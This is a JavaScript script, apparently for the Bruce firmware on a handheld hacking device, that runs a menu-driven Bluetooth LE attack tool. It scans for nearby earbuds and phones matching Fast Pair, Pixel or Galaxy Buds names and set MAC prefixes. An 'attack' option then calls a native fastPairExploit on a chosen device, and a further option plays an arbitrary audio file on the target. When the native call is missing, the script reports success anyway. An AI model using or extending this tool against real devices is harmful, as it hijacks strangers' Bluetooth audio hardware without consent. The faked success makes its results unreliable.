var dialog = require('dialog');
var serial = require('serial');
var display = require('display');
var keyboard = require('keyboard');

var dialogMessage = dialog.info;
var dialogChoice = dialog.choice;
var dialogError = dialog.error;

var serialPrintln = serial.println;
var fillScreen = display.fill;

var CONFIG = {
  SCAN_INTERVAL_MS: 3000,
  MIN_RSSI_DBM: -80,
  MAX_TRACKED_DEVICES: 10,
  NAME_REGEX: /Fast\s*Pair|Pixel|Galaxy Buds/i,
  MAC_PREFIXES: [
    "3C:5A:B4",
    "D4:3B:04"
  ]
};

var BleNative = {
  startScan: function (onDevice) {
    if (typeof BruceBle !== "undefined" && BruceBle.scanStart) {
      BruceBle.scanStart(function (addr, name, rssi) {
        onDevice({
          addr: addr,
          name: name || "",
          rssi: typeof rssi === "number" ? rssi : -127
        });
      });
    } else {
      serialPrintln("BleNative.startScan: BruceBle.scanStart not available");
    }
  },

  stopScan: function () {
    if (typeof BruceBle !== "undefined" && BruceBle.scanStop) {
      BruceBle.scanStop();
    } else {
      serialPrintln("BleNative.stopScan: BruceBle.scanStop not available");
    }
  },

  triggerAction: function (device, done) {
    if (typeof BruceBle !== "undefined" && BruceBle.fastPairExploit) {
      BruceBle.fastPairExploit(device.addr, function (ok) {
        done(!!ok);
      });
    } else {
      serialPrintln("BleNative.triggerAction: BruceBle.fastPairExploit not available, faking success");
      done(true);
    }
  },

  playFileOnDevice: function (device, filePath, done) {
    if (!filePath) {
      done(false);
      return;
    }

    if (typeof BruceBle !== "undefined" && BruceBle.playFileOnDevice) {
      BruceBle.playFileOnDevice(device.addr, filePath, function (ok) {
        done(!!ok);
      });
    } else {
      serialPrintln("BleNative.playFileOnDevice: BruceBle.playFileOnDevice not available");
      done(false);
    }
  }
};

function log(msg) {
  serialPrintln(msg);
}

var WhisperBruceApp = (function () {
  var _devices = [];
  var _scanning = false;

  function _matchesFilters(addr, name, rssi) {
    if (rssi < CONFIG.MIN_RSSI_DBM) {
      return false;
    }

    if (CONFIG.NAME_REGEX && !CONFIG.NAME_REGEX.test(name)) {
      return false;
    }

    if (CONFIG.MAC_PREFIXES && CONFIG.MAC_PREFIXES.length > 0) {
      var prefixMatch = false;
      var upper = addr.toUpperCase();
      for (var i = 0; i < CONFIG.MAC_PREFIXES.length; i++) {
        var p = CONFIG.MAC_PREFIXES[i];
        if (upper.indexOf(p) === 0) {
          prefixMatch = true;
          break;
        }
      }
      if (!prefixMatch) {
        return false;
      }
    }

    return true;
  }

  function _findDeviceIndex(addr) {
    for (var i = 0; i < _devices.length; i++) {
      if (_devices[i].addr === addr) {
        return i;
      }
    }
    return -1;
  }

  function _upsertDevice(addr, name, rssi) {
    var now = Date.now ? Date.now() : (new Date()).getTime();
    var idx = _findDeviceIndex(addr);

    if (idx >= 0) {
      var d = _devices[idx];
      d.rssi = rssi;
      d.lastSeen = now;
      if (d.seenCount < 0x7fffffff) {
        d.seenCount++;
      }
      return;
    }

    if (_devices.length >= CONFIG.MAX_TRACKED_DEVICES) {
      var weakestIdx = 0;
      var weakestRssi = _devices[0].rssi;
      for (var j = 1; j < _devices.length; j++) {
        if (_devices[j].rssi < weakestRssi) {
          weakestRssi = _devices[j].rssi;
          weakestIdx = j;
        }
      }
      _devices.splice(weakestIdx, 1);
    }

    _devices.push({
      addr: addr,
      name: name,
      rssi: rssi,
      lastSeen: now,
      seenCount: 1
    });
  }

  function _onScanDevice(dev) {
    var addr = dev && dev.addr ? dev.addr : "";
    var name = dev && dev.name ? dev.name : "";
    var rssi = dev && typeof dev.rssi === "number" ? dev.rssi : -127;

    if (!addr) {
      return;
    }

    if (!_matchesFilters(addr, name, rssi)) {
      return;
    }

    _upsertDevice(addr, name, rssi);
  }

  function _startScanLoop() {
    if (_scanning) {
      return;
    }
    _scanning = true;
    _devices.length = 0;
    BleNative.startScan(_onScanDevice);
  }

  function _stopScanLoop() {
    _scanning = false;
    BleNative.stopScan();
  }

  function _startScanAndWaitForFirstDevice() {
    _startScanLoop();

    while (true) {
      if (_devices.length > 0) {
        break;
      }
      if (keyboard && keyboard.getEscPress && keyboard.getEscPress()) {
        break;
      }
      if (!_scanning) {
        break;
      }
      delay(100);
    }

    _stopScanLoop();
  }

  function _getDeviceCount() {
    return _devices.length;
  }

  function _playSongOnDeviceByIndex(n, filePath) {
    if (!filePath) {
      dialogError("no song selected");
      return;
    }

    if (_devices.length === 0) {
      dialogError("no devices to play on");
      return;
    }

    if (!(n > 0 && n <= _devices.length)) {
      dialogError("invalid device index: " + n);
      return;
    }

    var target = _devices[n - 1];
    log("Playing file on: " + target.name + " [" + target.addr + "]");
    dialogMessage("Playing on " + target.addr);

    BleNative.playFileOnDevice(target, filePath, function (ok) {
      if (ok) {
        dialogMessage("playback OK for " + target.addr, true);
      } else {
        dialogError("playback FAILED for " + target.addr, true);
      }
    });
  }

  function _showDevices() {
    fillScreen(0);
    log("=== Matched Devices (" + _devices.length + ") ===");

    if (_devices.length === 0) {
      dialogError("no matching devices, start scan first");
      return;
    }

    for (var i = 0; i < _devices.length; i++) {
      var d = _devices[i];
      log(
        (i + 1) + ") " +
        d.name + " [" + d.addr + "], " +
        d.rssi + " dBm, seen " + d.seenCount + "x"
      );
    }
  }

  function _triggerActionByIndex(n) {
    if (_devices.length === 0) {
      dialogError("no devices to act on");
      return;
    }

    if (!(n > 0 && n <= _devices.length)) {
      dialogError("invalid device index: " + n);
      return;
    }

    var target = _devices[n - 1];
    log("Triggering action for: " + target.name + " [" + target.addr + "]");

    BleNative.triggerAction(target, function (ok) {
      if (ok) {
        dialogMessage("action OK for " + target.addr, true);
      } else {
        dialogError("action FAILED for " + target.addr, true);
      }
    });
  }

  return {
    startScan: _startScanLoop,
    startScanAndWaitForFirstDevice: _startScanAndWaitForFirstDevice,
    stopScan: _stopScanLoop,
    showDevices: _showDevices,
    triggerActionByIndex: _triggerActionByIndex,
    getDeviceCount: _getDeviceCount,
    playSongOnDeviceByIndex: _playSongOnDeviceByIndex
  };
})();

var running = true;
while (running) {
  var choice = dialogChoice({
    ["Start scan & wait"]: "scan",
    ["Stop scan"]: "stop",
    ["Show matched devices"]: "show",
    ["Trigger action"]: "attack",
    ["Play song on device"]: "play"
  });

  if (choice === "") {
    running = false;
  } else if (choice === "scan") {
    dialogMessage("Starting BLE scan..");
    WhisperBruceApp.startScanAndWaitForFirstDevice();
    if (WhisperBruceApp.getDeviceCount() > 0) {
      dialogMessage("device found!", true);
    } else {
      dialogMessage("scan stopped, no device", true);
    }
  } else if (choice === "stop") {
    WhisperBruceApp.stopScan();
    dialogMessage("Scan stopped", true);
  } else if (choice === "show") {
    WhisperBruceApp.showDevices();
  } else if (choice === "attack") {
    var idxStr = dialogChoice({
      ["Device #1"]: "1",
      ["Device #2"]: "2",
      ["Device #3"]: "3",
      ["Device #4"]: "4",
      ["Device #5"]: "5"
    });
    if (idxStr) {
      var idx = parseInt(idxStr, 10);
      WhisperBruceApp.triggerActionByIndex(idx);
    }
  } else if (choice === "play") {
    if (WhisperBruceApp.getDeviceCount() === 0) {
      dialogError("no devices, start scan first");
    } else {
      var playIdxStr = dialogChoice({
        ["Device #1"]: "1",
        ["Device #2"]: "2",
        ["Device #3"]: "3",
        ["Device #4"]: "4",
        ["Device #5"]: "5"
      });

      if (playIdxStr) {
        var songPath = dialog.pickFile("/");
        if (songPath) {
          var playIdx = parseInt(playIdxStr, 10);
          WhisperBruceApp.playSongOnDeviceByIndex(playIdx, songPath);
        }
      }
    }
  }

  fillScreen(0);
  delay(10);
}

